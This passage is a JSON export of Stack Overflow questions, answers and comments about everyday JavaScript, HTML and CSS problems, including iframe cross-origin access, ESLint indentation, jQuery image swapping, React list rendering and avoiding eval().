noreferrer\">https://test.example.com/index.html</a>:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n    &lt;p&gt;This is my test subdomain...&lt;p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>And here the code of my .htaccess file, of both domains, my <a href=\"https://example.com\" rel=\"nofollow noreferrer\">https://example.com</a> and <a href=\"https://test.example.com\" rel=\"nofollow noreferrer\">https://test.example.com</a>:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]\n\nHeader always set x-frame-options \"ALLOWALL\"\nHeader always set Access-Control-Allow-Origin: \"*\"\nHeader always set Access-Control-Allow-Credentials: \"true\"\nHeader always set Access-Control-Allow-Methods: \"POST, GET, OPTIONS\"\nHeader always set Access-Control-Allow-Headers: \"Content-Type\"\nHeader always set Origin: \"*\"\n</code></pre>\n\n<p>What went wrong and how can I fix it?</p>\n\n<p><strong>Note</strong>: I'm using Chrome, Firefox and Safari, to test my sites, The error is produced in this line: </p>\n\n<pre><code>console.log(window.frames[0].document.body.innerHTML);\n</code></pre>\n"}, {"tags": ["javascript", "eslint", "eslint-config-airbnb"], "owner": {"reputation": 776, "user_id": 3534080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ab31e45d933ac19753baa38f64347bf?s=128&d=identicon&r=PG&f=1", "display_name": "user3534080", "link": "https://stackoverflow.com/users/3534080/user3534080"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 342, "favorite_count": 1, "answer_count": 0, "score": 3, "last_activity_date": 1558566691, "creation_date": 1558566691, "question_id": 56266104, "link": "https://stackoverflow.com/questions/56266104/eslint-indent-and-operator-linebreak", "title": "ESLint indent and operator-linebreak", "body": "<p>We have our ESLint config inherit from airbnb's config.</p>\n\n<p>Despite the indent rule being turned on, for some reason, this is allowed:</p>\n\n<pre><code>let a = some * math\n* operators;\n</code></pre>\n\n<p>even though I would expect it to require the following (extra indentation for emphasis):</p>\n\n<pre><code>let a = some * math\n    * operators;\n</code></pre>\n\n<p>Indentation linting works as expected everywhere else.</p>\n\n<p>For example, linting will complain about the indentation here:</p>\n\n<pre><code>let c = somefunction(\nparm\n);\n</code></pre>\n\n<p>Is this a bug in ESLint, or is there a rule I need to turn on in my config? Nothing in indent's documentation seems to apply, and I don't see any other rules that seem relevant.</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["javascript", "jquery", "html", "css"], "comments": [{"owner": {"reputation": 36576, "user_id": 2341603, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ZTHIr.jpg?s=128&g=1", "display_name": "Obsidian Age", "link": "https://stackoverflow.com/users/2341603/obsidian-age"}, "edited": false, "score": 0, "creation_date": 1558566952, "post_id": 56266102, "comment_id": 99148460, "body": "Have you <a href=\"http://meta.stackoverflow.com/questions/261592\"><b>tried anything</b></a> so far?"}], "answers": [{"tags": [], "owner": {"reputation": 2724, "user_id": 1970822, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a60600ccf383f06065a582c328eedfdc?s=128&d=identicon&r=PG", "display_name": "Jan", "link": "https://stackoverflow.com/users/1970822/jan"}, "is_accepted": true, "score": 1, "last_activity_date": 1558568595, "creation_date": 1558568595, "answer_id": 56266325, "question_id": 56266102, "link": "https://stackoverflow.com/questions/56266102/change-image-with-only-jquery-or-javascript/56266325#56266325", "title": "Change image with only jquery or javascript", "body": "<p>You can query for the image tags inside the list-item and iterate with <code>each</code> over the returned array. Inside that loop you can check if the src of that image-element is what you are looking for and replace it.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>$('li.make img').each(function(index){\r\n  if ($(this).attr('src') == 'facebook.jpg') {\r\n    $(this).attr('src', 'facebook1.jpg');\r\n  }\r\n});</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt;\r\n\r\n&lt;li class=\"make\"&gt;\r\n  &lt;a href=\"#\"&gt;\r\n    &lt;img class=\"make-image\" src=\"facebook.jpg\"&gt;\r\n    &lt;div class=\"make-info\"&gt;\r\n      &lt;img class=\"make-logo\" src=\"facebook.jpg\"&gt;\r\n      &lt;div class=\"clearall\"&gt;&lt;/div&gt;\r\n    &lt;/div&gt;\r\n  &lt;/a&gt;\r\n&lt;/li&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 5, "user_id": 11541434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f90bec62092759e76da390759aae30d?s=128&d=identicon&r=PG&f=1", "display_name": "AVSchizo", "link": "https://stackoverflow.com/users/11541434/avschizo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 29, "favorite_count": 0, "accepted_answer_id": 56266325, "answer_count": 1, "score": 0, "last_activity_date": 1558568595, "creation_date": 1558566683, "question_id": 56266102, "link": "https://stackoverflow.com/questions/56266102/change-image-with-only-jquery-or-javascript", "title": "Change image with only jquery or javascript", "body": "<p>I am trying to change an image from an old to new using jquery or javascript only. It is the second picture out of three total that has a common parent element and is not separated by any specific parameters. </p>\n\n<p>I believe I need to use a DOM navigation of some sort to get to the exact picture in the common class but haven't had any luck. </p>\n\n<p>As I mentioned the 'make' class is shared between all three images as is 'make-image'. I need to simply swap the image for another updated version, facebook1.jpg.</p>\n\n<pre><code>&lt;li class=\"make \"&gt;\n        &lt;a href=\"#\"&gt;\n        &lt;img class=\"make-image\" src=\"facebook.jpg\"&gt;\n        &lt;div class=\"make-info\"&gt;\n            &lt;img class=\"make-logo\" src=\"facebook.jpg\"&gt;\n                &lt;div class=\"clearall\"&gt;&lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/a&gt;\n    &lt;/li&gt;\n\nIt should simply swap the existing image for another.\n</code></pre>\n"}, {"tags": ["javascript", "html", "css"], "answers": [{"comments": [{"owner": {"reputation": 81, "user_id": 11541757, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aacd40290c19c8e56301e0a716140119?s=128&d=identicon&r=PG&f=1", "display_name": "tryingtogethelp", "link": "https://stackoverflow.com/users/11541757/tryingtogethelp"}, "edited": false, "score": 0, "creation_date": 1558567052, "post_id": 56266095, "comment_id": 99148488, "body": "Brilliant, thank you. Knew it was a simple fix. Just couldn&#39;t manage it with all of the alignments."}, {"owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "reply_to_user": {"reputation": 81, "user_id": 11541757, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aacd40290c19c8e56301e0a716140119?s=128&d=identicon&r=PG&f=1", "display_name": "tryingtogethelp", "link": "https://stackoverflow.com/users/11541757/tryingtogethelp"}, "edited": false, "score": 0, "creation_date": 1558567112, "post_id": 56266095, "comment_id": 99148501, "body": "@tryingtogethelp You&#39;re welcome. Don&#39;t forget to up vote and mark as &quot;the&quot; answer."}], "tags": [], "owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "is_accepted": true, "score": 0, "last_activity_date": 1558566621, "creation_date": 1558566621, "answer_id": 56266095, "question_id": 56266079, "link": "https://stackoverflow.com/questions/56266079/center-links-with-animated-underline/56266095#56266095", "title": "Center links with animated underline", "body": "<p>Because it's <code>text-align:center</code>, not <code>align-content:center</code>.</p>\n\n<p>Also, you have an extra <code>&lt;/a&gt;</code> tag in your HTML.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.actions {\r\n    -webkit-align-content: center;\r\n    text-align: center;\r\n}\r\n\r\n.useraction {\r\n    font-family: 'Noto Sans', sans-serif;\r\n    font-size: 1.5vw;\r\n    text-align: center;\r\n    margin-top: 0px;\r\n    margin-bottom: 0px;\r\n    color: #000000;\r\n    line-height: 1em;\r\n}\r\n\r\n@media only screen and (max-width: 500px) {\r\n.useraction {\r\n    font-family: 'Noto Sans', sans-serif;\r\n    font-size: 0.75vw;\r\n    text-align: center;\r\n    margin-top: 0px;\r\n    margin-bottom: 0px;\r\n    color: #000000;\r\n    line-height: 1em;\r\n}\r\n}\r\n\r\na {\r\n  color: #FFFFFF;\r\n  text-decoration: none;\r\n  display: inline-block;\r\n  text-align: center;\r\n  padding: 0;\r\n  position: relative;\r\n}\r\n\r\na:after {    \r\n  background: none repeat scroll 0 0 transparent;\r\n  text-align: center;\r\n  bottom: 0;\r\n  content: \"\";\r\n  display: inline;\r\n  height: 0.5vh;\r\n  left: 50%;\r\n  position: absolute;\r\n  background:  #07F446;\r\n  transition: width 0.3s ease 0s, left 0.3s ease 0s;\r\n  width: 0;\r\n}\r\n\r\na:hover:after { \r\n  width: 100%; \r\n  left: 0; \r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;link href=\"https://fonts.googleapis.com/css?family=Noto+Sans&amp;display=swap\" rel=\"stylesheet\"&gt;\r\n&lt;div class=\"actions\"&gt;\r\n&lt;a href=\"/contact\"&gt; &lt;p class=\"useraction\"&gt;Contact&lt;/p&gt;&lt;/a&gt;\r\n&lt;br&gt;\r\n&lt;a href=\"/login\"&gt; &lt;p class=\"useraction\"&gt;Log In&lt;/p&gt;&lt;/a&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 81, "user_id": 11541757, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aacd40290c19c8e56301e0a716140119?s=128&d=identicon&r=PG&f=1", "display_name": "tryingtogethelp", "link": "https://stackoverflow.com/users/11541757/tryingtogethelp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 22, "favorite_count": 0, "accepted_answer_id": 56266095, "answer_count": 1, "score": 0, "last_activity_date": 1558566621, "creation_date": 1558566441, "question_id": 56266079, "link": "https://stackoverflow.com/questions/56266079/center-links-with-animated-underline", "title": "Center links with animated underline", "body": "<p>I've got this working fine but for some reason my links aren't centered.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.actions {\r\n    -webkit-align-content: center;\r\n    align-content: center;\r\n}\r\n\r\n.useraction {\r\n    font-family: 'Noto Sans', sans-serif;\r\n    font-size: 1.5vw;\r\n    text-align: center;\r\n    margin-top: 0px;\r\n    margin-bottom: 0px;\r\n    color: #000000;\r\n    line-height: 1em;\r\n}\r\n\r\n@media only screen and (max-width: 500px) {\r\n.useraction {\r\n    font-family: 'Noto Sans', sans-serif;\r\n    font-size: 0.75vw;\r\n    text-align: center;\r\n    margin-top: 0px;\r\n    margin-bottom: 0px;\r\n    color: #000000;\r\n    line-height: 1em;\r\n}\r\n}\r\n\r\na {\r\n  color: #FFFFFF;\r\n  text-decoration: none;\r\n  display: inline-block;\r\n  text-align: center;\r\n  padding: 0;\r\n  position: relative;\r\n}\r\n\r\na:after {    \r\n  background: none repeat scroll 0 0 transparent;\r\n  text-align: center;\r\n  bottom: 0;\r\n  content: \"\";\r\n  display: inline;\r\n  height: 0.5vh;\r\n  left: 50%;\r\n  position: absolute;\r\n  background:  #07F446;\r\n  transition: width 0.3s ease 0s, left 0.3s ease 0s;\r\n  width: 0;\r\n}\r\n\r\na:hover:after { \r\n  width: 100%; \r\n  left: 0; \r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;link href=\"https://fonts.googleapis.com/css?family=Noto+Sans&amp;display=swap\" rel=\"stylesheet\"&gt;\r\n&lt;div class=\"actions\"&gt;\r\n&lt;a href=\"/contact\"&gt; &lt;p class=\"useraction\"&gt;Contact&lt;/p&gt;&lt;/a&gt;&lt;/a&gt;\r\n&lt;br&gt;\r\n&lt;a href=\"/login\"&gt; &lt;p class=\"useraction\"&gt;Log In&lt;/p&gt;&lt;/a&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>As you can see, the underlines work but for some reason the links are left aligned. I need the links to show in the center.</p>\n\n<p>Any help would be very much appreciated, thanks in advance.</p>\n"}, {"tags": ["javascript", "html", "angularjs", "drop-down-menu", "angularjs-select"], "answers": [{"tags": [], "owner": {"reputation": 16, "user_id": 11530889, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/798e85c10afdfa3bcdc9e65e2c5d6be9?s=128&d=identicon&r=PG&f=1", "display_name": "vishwas", "link": "https://stackoverflow.com/users/11530889/vishwas"}, "is_accepted": true, "score": 0, "last_activity_date": 1558917086, "creation_date": 1558917086, "answer_id": 56318389, "question_id": 56266078, "link": "https://stackoverflow.com/questions/56266078/dynamically-change-dropdown-select-defaults-depending-on-existing-values-in-arra/56318389#56318389", "title": "Dynamically change dropdown select defaults depending on existing values in array", "body": "<p>You cannot share model if you want to have different values for all drop downs.\n<strong>ng-model</strong> should be different for all drop downs and this can be achieved by having array of drop downs as below.</p>\n\n<pre><code>  $scope.dropDowns = [{\n    dropDownName: 'Test1:',\n    id: 'test1',\n    selectedOption: ''\n  }, {\n    dropDownName: 'Test2:',\n    id: 'test2',\n    selectedOption: ''\n  }];\n</code></pre>\n\n<p>see the running example in \n<a href=\"http://plnkr.co/edit/jsAn1jwGkQfxXK5I9G6J?p=preview\" rel=\"nofollow noreferrer\">http://plnkr.co/edit/jsAn1jwGkQfxXK5I9G6J?p=preview</a></p>\n"}], "owner": {"reputation": 23, "user_id": 11337317, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-usfEMQblfN4/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rftsJ-Ks-RxbIx5qtHwJF0QLm7tzw/mo/photo.jpg?sz=128", "display_name": "Ren Sasaki", "link": "https://stackoverflow.com/users/11337317/ren-sasaki"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "protected_date": 1558917660, "accepted_answer_id": 56318389, "answer_count": 1, "score": 0, "last_activity_date": 1558917086, "creation_date": 1558566439, "last_edit_date": 1558586055, "question_id": 56266078, "link": "https://stackoverflow.com/questions/56266078/dynamically-change-dropdown-select-defaults-depending-on-existing-values-in-arra", "title": "Dynamically change dropdown select defaults depending on existing values in array", "body": "<p>I am new to web development and AngularJS and I have been struggling with how to go about this. Sorry for the bad English.</p>\n\n<p>I use an ng-repeat that creates the correct number of dropdowns I need as this needs to be dynamic. The dropdowns have a label like:</p>\n\n<pre><code>Test1: &lt;dropdown here&gt;\nTest2: &lt;dropdown here&gt; ...etc.\n</code></pre>\n\n<p>I have a HTTP request that returns an array. If the array has \"Test1 State1\" in it, I would like the dropdown for Test1: to change to State1 on default. (continues with all the Tests)</p>\n\n<p>How can I go about this?</p>\n\n<p>HTML</p>\n\n<pre><code>&lt;div ng-repeat=\"o in options track by $index\"&gt;\n    &lt;label for=\"{{::$o}}\" class=\"col-xs-3\"&gt;{{o}}:&lt;/label&gt;\n    &lt;select id=\"{{::$o}}\" ng-model=\"stateModel\"\n            ng-options=\"state.changeToState for state in states\"\n            ng-change=\"onStateSelect(stateModel.platformReleaseNotes, o)\"&gt; \n      {{state}}\n    &lt;/select&gt;\n&lt;/div&gt;\n</code></pre>\n\n<pre><code>$scope.states = [\n    {\n      changeToState: 'State1',\n      notes: 'Hello World'\n    },\n    {\n      changeToState: 'State2',\n      notes: 'Goodbye'\n    },\n    {\n      changeToState: 'State3',\n      notes: ' is State3'\n    },\n    {\n      changeToState: 'State4',\n      notes: ' is State4'\n    }\n  ];\n</code></pre>\n"}, {"tags": ["javascript", "html", "forms", "dom"], "answers": [{"tags": [], "owner": {"reputation": 1360, "user_id": 9070080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92d2963cabea92148f85e62998123dd1?s=128&d=identicon&r=PG&f=1", "display_name": "Snel23", "link": "https://stackoverflow.com/users/9070080/snel23"}, "is_accepted": false, "score": 3, "last_activity_date": 1558566979, "creation_date": 1558566979, "answer_id": 56266151, "question_id": 56266072, "link": "https://stackoverflow.com/questions/56266072/html-select-tag-how-to-convert-string-value-into-javascript-without-using-eval/56266151#56266151", "title": "Html-Select-Tag-How to convert string value into javascript without using eval()?", "body": "<p>Seems like your eval is unnecessary, simply just retrieve the <code>value</code> attribute from the element itself, and it will return it to the variable <code>color</code>.</p>\n\n<pre><code>const color = document.getElementById('color').value; \n</code></pre>\n\n<p>Or if you prefer to keep the element as a variable:</p>\n\n<pre><code>const color = document.getElementById('color'); \nconst selectedColorValue = color.value;  //No need for eval\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1541, "user_id": 2503592, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/ZoJBS.jpg?s=128&g=1", "display_name": "kapitan", "link": "https://stackoverflow.com/users/2503592/kapitan"}, "is_accepted": false, "score": 0, "last_activity_date": 1558570790, "creation_date": 1558570790, "answer_id": 56266568, "question_id": 56266072, "link": "https://stackoverflow.com/questions/56266072/html-select-tag-how-to-convert-string-value-into-javascript-without-using-eval/56266568#56266568", "title": "Html-Select-Tag-How to convert string value into javascript without using eval()?", "body": "<p>You are just missing a <code>.value</code> on your script like so:</p>\n\n<p>Please click on the <code>Run code snippet</code> blue button below.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>function getValue()\r\n{\r\n\r\nconst color = document.getElementById('color').value;\r\nconsole.log(color);\r\n\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;select name=\"\" id=\"color\" onchange='getValue()'&gt;\r\n     &lt;option value=\"blue\"&gt;blue&lt;/option&gt;\r\n     &lt;option value=\"red\"&gt;red&lt;/option&gt;\r\n     &lt;option value=\"green\"&gt;green&lt;/option&gt;\r\n&lt;/select&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 283, "user_id": 9272254, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-JsNBfWENfLw/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdo1hOg5CFEKko9pwRtdBBL4m1FXA/mo/photo.jpg?sz=128", "display_name": "Kaiser91", "link": "https://stackoverflow.com/users/9272254/kaiser91"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1558570790, "creation_date": 1558566386, "question_id": 56266072, "link": "https://stackoverflow.com/questions/56266072/html-select-tag-how-to-convert-string-value-into-javascript-without-using-eval", "title": "Html-Select-Tag-How to convert string value into javascript without using eval()?", "body": "<p>I've read in some post that is not a good practice to use <strong>eval()</strong> method in JavaScript. So I would like to find a way to obtain the same value on <em>selectedColorValue</em> without using <strong>eval()</strong> and be able to manipulate this value. \nI've tried with </p>\n\n<p>const selectedColorValue = color.options[color.selectedIndex]; but any success.</p>\n\n<p>HTML</p>\n\n<pre><code>&lt;select name=\"\" id=\"color\"&gt;\n     &lt;option value=\"blue\"&gt;blue&lt;/option&gt;\n     &lt;option value=\"red\"&gt;red&lt;/option&gt;\n     &lt;option value=\"green\"&gt;green&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p>JAVASCRIPT</p>\n\n<pre><code> const color = document.getElementById('color');\n\n //const selectedColorValue = eval(color.value);\n</code></pre>\n"}, {"tags": ["javascript", "reactjs", "jsx"], "comments": [{"owner": {"reputation": 718999, "user_id": 5445, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/932fb89b9d4049cec5cba357bf0ae388?s=128&d=identicon&r=PG", "display_name": "Christian C. Salvad&#243;", "link": "https://stackoverflow.com/users/5445/christian-c-salvad%c3%b3"}, "edited": false, "score": 1, "creation_date": 1558566883, "post_id": 56266069, "comment_id": 99148445, "body": "1. Use map instead of forEach. 2. I would recommend to return jsx instead of a string and use the generateItem function as a <i>functional component</i> instead of a function that returns something."}], "answers": [{"comments": [{"owner": {"reputation": 786, "user_id": 1061836, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/g0fCn.png?s=128&g=1", "display_name": "Trees4theForest", "link": "https://stackoverflow.com/users/1061836/trees4theforest"}, "edited": false, "score": 0, "creation_date": 1558569392, "post_id": 56266097, "comment_id": 99148882, "body": "Hmm... so the whole &quot;use can use regular javascript inside curly brackets&quot; thing comes with some caveats. This helps."}, {"owner": {"reputation": 30383, "user_id": 4879, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dk0Qb.jpg?s=128&g=1", "display_name": "pawel", "link": "https://stackoverflow.com/users/4879/pawel"}, "reply_to_user": {"reputation": 786, "user_id": 1061836, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/g0fCn.png?s=128&g=1", "display_name": "Trees4theForest", "link": "https://stackoverflow.com/users/1061836/trees4theforest"}, "edited": false, "score": 0, "creation_date": 1558632486, "post_id": 56266097, "comment_id": 99174514, "body": "@Trees4theForest your code works perfectly fine within curly brackets, it just doesn&#39;t return anything to render."}, {"owner": {"reputation": 30383, "user_id": 4879, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dk0Qb.jpg?s=128&g=1", "display_name": "pawel", "link": "https://stackoverflow.com/users/4879/pawel"}, "edited": false, "score": 0, "creation_date": 1558633340, "post_id": 56266097, "comment_id": 99174880, "body": "Here&#39;s an example that makes <code>.forEach</code> work by returning something from the expression. I would reject this in a code review, because <code>.map</code> is the most idiomatic way to do this, so just to illustrate the point: <a href=\"https://codesandbox.io/s/quizzical-haze-4mr8q\" rel=\"nofollow noreferrer\">codesandbox.io/s/quizzical-haze-4mr8q</a>"}], "tags": [], "owner": {"reputation": 4252, "user_id": 4023734, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-OO2lME5F2w4/AAAAAAAAAAI/AAAAAAAAEFc/-tUTc5hm3fA/photo.jpg?sz=128", "display_name": "Tiago Coelho", "link": "https://stackoverflow.com/users/4023734/tiago-coelho"}, "is_accepted": true, "score": 4, "last_activity_date": 1558566949, "last_edit_date": 1558566949, "creation_date": 1558566632, "answer_id": 56266097, "question_id": 56266069, "link": "https://stackoverflow.com/questions/56266069/why-does-function-returned-data-not-render-in-react/56266097#56266097", "title": "Why does function-returned data not render in react?", "body": "<p><code>items.forEach</code> does not return anything... the things inside curly brackets in jsx will end up transpiled to an argument in a call to React.createElement, so they need to be an expression and return a value. (check here the <a href=\"https://babeljs.io/repl/#?babili=false&amp;browsers=&amp;build=&amp;builtIns=false&amp;spec=false&amp;loose=false&amp;code_lz=DwEwlgbgBAxgNgQwM5IHIILYFMC8AiOMJAFzwD4AoKKYAVzkuuoG8xisMkA6AMwHsATgFEEMABYAKNhyg4yUZlSbUA5lgB2WAQnYBJdhikGAlAG4l1AL7HLS4AHp6lB-AhkgA&amp;debug=false&amp;forceAllTransforms=false&amp;shippedProposals=false&amp;circleciRepo=&amp;evaluate=false&amp;fileSize=false&amp;timeTravel=false&amp;sourceType=module&amp;lineWrap=true&amp;presets=es2015%2Creact%2Cstage-2&amp;prettier=false&amp;targets=&amp;version=7.4.5&amp;externalPlugins=\" rel=\"nofollow noreferrer\">transpiled version</a>)</p>\n\n<p>Try <code>items.map(item =&gt; generateItem(item))</code> or simply <code>items.map(generateItem)</code> instead.</p>\n\n<p>here's your code edited (I also changed generateItem to return jsx instead of a string)</p>\n\n<p><a href=\"https://codesandbox.io/s/frosty-sutherland-fp7kh\" rel=\"nofollow noreferrer\">https://codesandbox.io/s/frosty-sutherland-fp7kh</a></p>\n"}], "owner": {"reputation": 786, "user_id": 1061836, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/g0fCn.png?s=128&g=1", "display_name": "Trees4theForest", "link": "https://stackoverflow.com/users/1061836/trees4theforest"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35, "favorite_count": 0, "accepted_answer_id": 56266097, "answer_count": 1, "score": 1, "last_activity_date": 1558566949, "creation_date": 1558566361, "question_id": 56266069, "link": "https://stackoverflow.com/questions/56266069/why-does-function-returned-data-not-render-in-react", "title": "Why does function-returned data not render in react?", "body": "<p>Admittedly learning react &amp; jsx, but can't for the life of me figure out why this does not render:    </p>\n\n<pre><code>function generateItem(item){\n  return `&lt;li&gt;&lt;a href=${item.url}&gt;${item.text}&lt;/a&gt;&lt;/li&gt;`;\n}\n\nfunction MyList ({items}){\n  return (\n      &lt;div className=\"list\"&gt;\n        &lt;ul&gt;\n          {items.forEach(item =&gt; {\n            generateItem(item);\n          })}\n        &lt;/ul&gt;\n      &lt;/div&gt;\n  );\n};\n</code></pre>\n\n<p>All it outputs (when included in my app) is an empty list:</p>\n\n<pre><code>&lt;div class=\"list\"&gt;&lt;ul&gt;&lt;/ul&gt;&lt;/div&gt;\n</code></pre>\n\n<p>I'm sure it's something basic and fundamental. But there I am.</p>\n\n<p><a href=\"https://codesandbox.io/s/relaxed-stallman-81ety\" rel=\"nofollow noreferrer\">https://codesandbox.io/s/relaxed-stallman-81ety</a></p>\n"}, {"tags": ["javascript", "html", "css"], "comments": [{"owner": {"reputation": 4970, "user_id": 305953, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/ncprD.jpg?s=128&g=1", "display_name": "Dez", "link": "https://stackoverflow.com/users/305953/dez"}, "edited": false, "score": 2, "creation_date": 1558566245, "post_id": 56266038, "comment_id": 99148308, "body": "Where is your element with id <code>main</code>?"}, {"owner": {"reputation": 71, "user_id": 11518587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efbb5d6c5ab48c75bde99ac611082548?s=128&d=identicon&r=PG&f=1", "display_name": "htmlhelp32", "link": "https://stackoverflow.com/users/11518587/htmlhelp32"}, "reply_to_user": {"reputation": 4970, "user_id": 305953, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/ncprD.jpg?s=128&g=1", "display_name": "Dez", "link": "https://stackoverflow.com/users/305953/dez"}, "edited": false, "score": 0, "creation_date": 1558566317, "post_id": 56266038, "comment_id": 99148322, "body": "@dez sorry ignore that part, removing it from there rn"}, {"owner": {"reputation": 177576, "user_id": 8620333, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSmLn.png?s=128&g=1", "display_name": "Temani Afif", "link": "https://stackoverflow.com/users/8620333/temani-afif"}, "edited": false, "score": 1, "creation_date": 1558566544, "post_id": 56266038, "comment_id": 99148367, "body": "share a full code, where and when you are calling the function?"}, {"owner": {"reputation": 71, "user_id": 11518587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efbb5d6c5ab48c75bde99ac611082548?s=128&d=identicon&r=PG&f=1", "display_name": "htmlhelp32", "link": "https://stackoverflow.com/users/11518587/htmlhelp32"}, "reply_to_user": {"reputation": 177576, "user_id": 8620333, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSmLn.png?s=128&g=1", "display_name": "Temani Afif", "link": "https://stackoverflow.com/users/8620333/temani-afif"}, "edited": false, "score": 0, "creation_date": 1558566700, "post_id": 56266038, "comment_id": 99148403, "body": "@TemaniAfif sorry thought i had the part where I was calling it in there, just added it, its in the navigation"}, {"owner": {"reputation": 28285, "user_id": 5921, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2854463112421fe6a69cfd104d57701c?s=128&d=identicon&r=PG", "display_name": "machineghost", "link": "https://stackoverflow.com/users/5921/machineghost"}, "edited": false, "score": 0, "creation_date": 1558566829, "post_id": 56266038, "comment_id": 99148428, "body": "Can you please include the part where you bind <code>openNav</code> to an event listener?"}, {"owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "edited": false, "score": 0, "creation_date": 1558566830, "post_id": 56266038, "comment_id": 99148429, "body": "<code>(x = true)</code> is <b>always true</b> because it does assign <code>true</code> to <code>x</code>, not <b>compare</b>. For comparison in Javascript, do ( x == true) or (x === true)."}, {"owner": {"reputation": 71, "user_id": 11518587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efbb5d6c5ab48c75bde99ac611082548?s=128&d=identicon&r=PG&f=1", "display_name": "htmlhelp32", "link": "https://stackoverflow.com/users/11518587/htmlhelp32"}, "reply_to_user": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "edited": false, "score": 0, "creation_date": 1558566970, "post_id": 56266038, "comment_id": 99148466, "body": "@connexo yea i saw that and fixed it in my code but still getting that error"}, {"owner": {"reputation": 71, "user_id": 